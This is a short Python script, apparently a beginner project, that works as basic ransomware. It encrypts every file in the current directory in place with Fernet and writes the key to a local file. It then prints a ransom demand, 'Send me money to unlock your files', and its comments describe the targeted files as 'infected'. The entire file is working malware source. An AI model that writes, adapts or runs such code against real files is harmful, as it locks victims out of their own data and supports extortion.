#! usr/bin/env python3
#	Above line is **sha-bang**. Besides its fancy name, it has a use case, watch out online. IT's COOL btw.

#python script for Encryption - pycript.

import os
#Fernet is a py lib for encryption-decryption ops
from cryptography.fernet import Fernet

files = [] # To store the files, that will be infected


#so basically, here we are just adding all TARGET files, which are those in the current Dir, to the files list.. Except our script. 
#Coz, script shouldnt be encrypted
for file in os.listdir():
	if file == "pycript-voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "status.txt":
		continue

#	This is done, so if there is any dir in the current dir, it should not be affected
	if os.path.isfile(file):
		files.append(file)

print (files)

if not os.path.exists("status.txt"):
	with open("status.txt", "w") as status:
		status.write("")

#Checking if the files are already encrypted, to avoid mishappenings
with open("status.txt", "r") as status:
	status_encryption = status.read()

if status_encryption == "":
	key = Fernet.generate_key()

	#Saving the key to a file, using python file ops

	with open("thekey.key", "wb") as thekey:
		thekey.write(key)


	#Now actually ENCRYPTING THE CONTENTS!

	for file in files:
	#	Read file contents and prepared the encrypted contents
		with open(file, "rb") as thefile:
			contents = thefile.read()

		contents_encrypted = Fernet(key).encrypt(contents)

	#	Writing the encrypted contents in files
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypted)



	print ("All your files have been Encrypted! Send me money to unlock your files😈😈")

	with open("status.txt", "w") as status:
		status.write("Files are Encrypted")

else :
	print ("Files are already Encrypted!")
